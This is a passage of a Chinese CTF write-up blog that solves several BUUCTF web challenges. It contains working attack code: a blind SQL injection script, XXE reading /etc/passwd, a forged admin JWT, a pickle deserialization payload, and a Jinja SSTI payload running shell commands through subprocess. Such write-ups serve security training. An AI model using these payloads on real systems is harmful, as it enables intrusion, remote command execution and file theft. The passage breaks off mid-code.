id="WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢"></a>[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</h2><p>å¸ƒå°”ç›²æ³¨ï¼Œçœ‹è¿™é¢˜<a href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL">[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://e3fad2bd-ba6f-41a9-bb23-275458f3c9ed.node4.buuoj.cn:81/"</span>name<span class="token operator">=</span><span class="token string">",QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890"</span>flag<span class="token operator">=</span><span class="token string">"flag&#123;1234567890-bcde&#125;,"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flag<span class="token punctuation">:</span>        parma<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">'stunum'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"1*(ascii(substr((select(group_concat(value))from(ctf.flag)),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span>        <span class="token punctuation">&#125;</span>        tex<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>parma<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"Hi admin, your score is: 100"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>%0Aæ¢è¡Œæˆªæ–­ç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">payload:cmd&#x3D;&#123;%0A&quot;cmd&quot;:&quot;&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag&quot;%0A&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p>å…ˆçœ‹æºç </p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpinclude &#39;config.php&#39;; &#x2F;&#x2F; FLAG is defined in config.phpif (preg_match(&#39;&#x2F;config\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);&#125;if (isset($_GET[&#39;source&#39;])) &#123;  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));  exit();&#125;$secret &#x3D; bin2hex(random_bytes(64));if (isset($_POST[&#39;guess&#39;])) &#123;  $guess &#x3D; (string) $_POST[&#39;guess&#39;];  if (hash_equals($secret, $guess)) &#123;    $message &#x3D; &#39;Congratulations! The flag is: &#39; . FLAG;  &#125; else &#123;    $message &#x3D; &#39;Wrong.&#39;;  &#125;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ©ç”¨çš„æ˜¯<code>basename</code>å‡½æ•°å’Œ<code>$_SERVER[&#39;PHP_SELF&#39;]</code></p><p>basenameå‡½æ•°ä¼šè¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ï¼Œå¦‚</p><pre class="line-numbers language-none"><code class="language-none">basename(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&quot;)&#x3D;index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>$_SERVER[&#39;PHP_SELF&#39;]</code>è¿”å›çš„æ˜¯urlä¸­æ–‡ä»¶éƒ¨åˆ†</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;test&#x2F;index.phpPHP_SELFå†…å®¹å°±æ˜¯&#x2F;test&#x2F;index.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>basenameå‡½æ•°æœ‰ä¸€ä¸ªbugï¼Œå®ƒä¼šå»æ‰æ–‡ä»¶åå¼€å¤´çš„éASCIIå€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ payloadåœ¨config.phpæœ€åå†åŠ ä¸€ä¸ªéasciiå­—ç¬¦å³å¯</p><pre class="line-numbers language-none"><code class="language-none">payload:index.php&#x2F;config.php&#x2F;%FF?source<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>éšæ„è¾“å…¥ç”¨æˆ·åå¯†ç ï¼ŒæŠ“åŒ…å‘ç°å†…å®¹ä½¿ç”¨xmlä¼ è¾“ï¼Œå°è¯•æ„é€ XXEæ¼æ´</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY admin SYSTEM "file:///etc/passwd"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&admin;">&amp;admin;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-03">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-03</a> 23.20.24.png)</p><p>æµ‹è¯•å›æ˜¾æˆåŠŸ</p><p>çŒœæµ‹flagåœ¨æ ¹ç›®å½•ä¸‹ï¼Œæ‹¿åˆ°flag</p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</h2><p>çœ‹æ ‡é¢˜å†…å®¹ï¼Œæç¤ºè¦ä¹°LV6</p><pre class="line-numbers language-none"><code class="language-none">## çˆ†ç ´*ç«™ï¼šèµ„é‡‘å‹Ÿé›† 11540.0ikunä»¬å†²é¸­,ä¸€å®šè¦ä¹°åˆ°lv6!!!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å†™ä¸ªè„šæœ¬å…ˆæ‰¾åˆ°LV6</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://14806839-f3e4-4cb2-8762-4f6d771a95b0.node4.buuoj.cn:81/shop?page="</span>name<span class="token operator">=</span><span class="token string">"static/img/lv/lv6.png"</span>i<span class="token operator">=</span><span class="token number">2</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    tex<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">if</span> name <span class="token keyword">in</span> tex<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    i<span class="token operator">+=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‘ç°åœ¨181é¡µ</p><p>éœ€è¦çš„money<del>å¤ªè‡­äº†ä¸ä¹°äº†</del>å¤ªå¤šäº†ï¼ŒæŠ“åŒ…æ›´æ”¹æŠ˜æ‰£è´­ä¹°ï¼Œè€Œåæç¤ºè¯¥é¡µé¢åªå…è®¸adminè®¿é—®ï¼ŒæŠ“åŒ…å‘ç°JWTï¼Œæ‰¾ä¸ª<a href="https://github.com/brendan-rius/c-jwt-cracker">è„šæœ¬</a>çˆ†ç ´å¯†é’¥</p><p>çˆ†ç ´å‡ºçš„å¯†é’¥ä¸º<code>1Kun</code></p><p>å†åœ¨<a href="">jwt.io</a>ä¸­ç”Ÿæˆæ–°çš„jwt</p><pre class="line-numbers language-none"><code class="language-none">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/1be8776440c7499882db6dfd0e32d3cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZWxpZm9yc2hhcm9u,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-03">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-03</a> 23.47.04.png)</p><p>çœ‹æºç ä¸‹è½½æ–‡ä»¶</p><p>å…³é”®å†…å®¹åœ¨sshop/views/Admin.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#Admin.py</span><span class="token keyword">import</span> tornado<span class="token punctuation">.</span>web<span class="token keyword">from</span> sshop<span class="token punctuation">.</span>base <span class="token keyword">import</span> BaseHandler<span class="token keyword">import</span> pickle<span class="token keyword">import</span> urllib<span class="token keyword">class</span> <span class="token class-name">AdminHandler</span><span class="token punctuation">(</span>BaseHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token decorator annotation punctuation">@tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>authenticated</span>    <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>current_user <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'no_ass.html'</span><span class="token punctuation">)</span>    <span class="token decorator annotation punctuation">@tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>authenticated</span>    <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            become <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">'become'</span><span class="token punctuation">)</span>            p <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>become<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>p<span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¢˜ç›®ä¸­æç¤ºäº†pickleï¼Œçœ‹çœ‹è¿™æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿</p><blockquote><p>pythonçš„pickleæ¨¡å—å®ç°äº†åŸºæœ¬çš„æ•°æ®åºåˆ—å’Œååºåˆ—åŒ–</p><table><thead><tr><th>å‡½æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>dumps</td><td>å¯¹è±¡ååºåˆ—åŒ–ä¸ºbyteså¯¹è±¡</td></tr><tr><td>dump</td><td>å¯¹è±¡ååºåˆ—åŒ–åˆ°æ–‡ä»¶å¯¹è±¡ï¼Œå­˜å…¥æ–‡ä»¶</td></tr><tr><td>loads</td><td>ä»byteså¯¹è±¡ååºåˆ—åŒ–</td></tr><tr><td>load</td><td>å¯¹è±¡ååºåˆ—åŒ–ï¼Œä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®</td></tr></tbody></table></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#æ–‡ä»¶</span><span class="token comment">#åºåˆ—åŒ–</span>pickle<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="token punctuation">)</span>objè¡¨ç¤ºè¦è¿›è¡Œå°è£…çš„å¯¹è±¡<span class="token punctuation">(</span>å¿…å¡«å‚æ•°ï¼‰<span class="token builtin">file</span>è¡¨ç¤ºobjè¦å†™å…¥çš„æ–‡ä»¶å¯¹è±¡ä»¥äºŒè¿›åˆ¶å¯å†™æ¨¡å¼æ‰“å¼€å³wb<span class="token punctuation">(</span>å¿…å¡«å‚æ•°ï¼‰<span class="token comment">#ååºåˆ—åŒ–</span>pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> fix_imports<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"ASCII"</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">"strict"</span><span class="token punctuation">,</span> buffers<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token builtin">file</span>æ–‡ä»¶ä¸­è¯»å–å°å­˜åçš„å¯¹è±¡ä»¥äºŒè¿›åˆ¶å¯è¯»æ¨¡å¼æ‰“å¼€å³rb<span class="token punctuation">(</span>å¿…å¡«å‚æ•°<span class="token punctuation">)</span><span class="token comment">#å¯¹è±¡</span><span class="token comment">#åºåˆ—åŒ–</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">,</span>fix_imports<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>dumps<span class="token punctuation">(</span><span class="token punctuation">)</span>æ–¹æ³•ä¸éœ€è¦å†™å…¥æ–‡ä»¶ä¸­ï¼Œç›´æ¥è¿”å›ä¸€ä¸ªåºåˆ—åŒ–çš„<span class="token builtin">bytes</span>å¯¹è±¡ã€‚<span class="token comment">#ååºåˆ—åŒ–</span>pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>bytes_object<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span>fix_imports<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"ASCII"</span><span class="token punctuation">.</span> errors<span class="token operator">=</span><span class="token string">"strict"</span><span class="token punctuation">)</span>loads<span class="token punctuation">(</span><span class="token punctuation">)</span>æ–¹æ³•æ˜¯ç›´æ¥ä»<span class="token builtin">bytes</span>å¯¹è±¡ä¸­è¯»å–åºåˆ—åŒ–çš„ä¿¡æ¯ï¼Œè€Œéä»æ–‡ä»¶ä¸­è¯»å–ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŸ¥æ‰¾åå¾—çŸ¥<a href="https://www.freebuf.com/articles/web/252189.html">pickleååºåˆ—åŒ–æ¼æ´</a></p><blockquote><p>ç®€è€Œè¨€ä¹‹ï¼Œpickleçš„loadsåœ¨è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨<code>__reduce__</code>é­”æœ¯æ–¹æ³•ï¼Œä¹Ÿå°±å¯ä»¥åˆ©ç”¨è¯¥é­”æœ¯æ–¹æ³•æ„é€ payload</p></blockquote><p>å‘½ä»¤æ‰§è¡Œä¾‹å­</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">Test2</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#è¢«è°ƒç”¨å‡½æ•°çš„å‚æ•°</span>        cmd <span class="token operator">=</span> <span class="token string">"/usr/bin/id"</span>         <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    test <span class="token operator">=</span> Test2<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#æ‰§è¡Œåºåˆ—åŒ–æ“ä½œ</span>    result1 <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>test<span class="token punctuation">)</span>    <span class="token comment">#æ‰§è¡Œååºåˆ—åŒ–æ“ä½œ</span>    result2 <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>result1<span class="token punctuation">)</span><span class="token comment"># __reduce__()é­”æ³•æ–¹æ³•çš„è¿”å›å€¼:</span><span class="token comment"># return(os.system,(cmd,))</span><span class="token comment"># 1.æ»¡è¶³è¿”å›ä¸€ä¸ªå…ƒç»„ï¼Œå…ƒç»„ä¸­æœ‰ä¸¤ä¸ªå‚æ•°</span><span class="token comment"># 2.ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¢«è°ƒç”¨å‡½æ•° : os.system()</span><span class="token comment"># 3.ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå…ƒç»„:(cmd,),å…ƒç»„ä¸­è¢«è°ƒç”¨çš„å‚æ•° cmd</span><span class="token comment"># 4. å› æ­¤åºåˆ—åŒ–æ—¶è¢«è§£ææ‰§è¡Œçš„ä»£ç æ˜¯ os.system("/usr/bin/id")</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‚£ä¹ˆå°±æ¥æ„é€ ä¸ªpayloadå§</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#python2</span><span class="token keyword">import</span> pickle<span class="token keyword">import</span> urllib<span class="token keyword">class</span> <span class="token class-name">payload</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"open('/flag.txt','r').read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span> a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27&#x2F;flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æäº¤å³å¯</p><h2 id="GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–"><a href="#GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–"></a>[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</h2><p>æºç </p><pre class="line-numbers language-none"><code class="language-none">&lt;?php #è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼ header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;); session_start(); if(!isset($_SESSION[&#39;seed&#39;]))&#123; $_SESSION[&#39;seed&#39;]&#x3D;rand(0,999999999); &#125; mt_srand($_SESSION[&#39;seed&#39;]); $str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $str&#x3D;&#39;&#39;; $len1&#x3D;20; for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;     $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);        &#125; $str_show &#x3D; substr($str, 0, 10); echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;&#x2F;p&gt;&quot;; if(isset($_POST[&#39;num&#39;]))&#123;     if($_POST[&#39;num&#39;]&#x3D;&#x3D;&#x3D;$str)&#123;x         echo &quot;&lt;p id&#x3D;flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;&#x2F;p&gt;&quot;;     &#125;     else&#123;         echo &quot;&lt;p id&#x3D;flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;&#x2F;p&gt;&quot;;     &#125; &#125; show_source(&quot;check.php&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¼ªéšæœºæ•°æ¼æ´ï¼Œå…ˆç®—å‡ºéœ€è¦çš„éšæœºæ•°å§</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>key <span class="token operator">=</span> <span class="token string">'S5KnjyVcrs'</span>m <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> key<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            m <span class="token operator">+=</span> <span class="token string">"&#123;&#125; &#123;&#125; 0 &#123;&#125; "</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>j<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-04">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-04</a> 22.41.58.png)</p><p>è·‘å‡ºæ¥ä¸€ä¸ªå°è¯•ä¸€ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php#version:php7.3.4mt_srand(830361885);$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str&#x3D;&#39;&#39;;$len1&#x3D;20;for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       &#125;echo $str;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆåŠŸ</p><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>SSTI</p><p>configé‡Œé¢æœ‰æç¤º</p><pre class="line-numbers language-none"><code class="language-none">&#39;SECRET_KEY&#39;: &#39;CCC&#123;f4k3_Fl49_:v&#125; CCC&#123;the_flag_is_this_dir&#125;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ„é€ è¯»æ–‡ä»¶çš„ç±»å’¯</p><pre class="line-numbers language-none"><code class="language-none">search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[-1].__subclasses__()&#125;&#125;é‡Œé¢æœ‰&lt;class &#39;subprocess.Popen&#39;&gt;ï¼Œåœ¨258ä½<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">payload:search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[-1].__subclasses__()[258](&#39;cat flasklight&#x2F;coomme_geeeett_youur_flek&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>è¿›å…¥å°±æ˜¯æºç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getUrl'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token 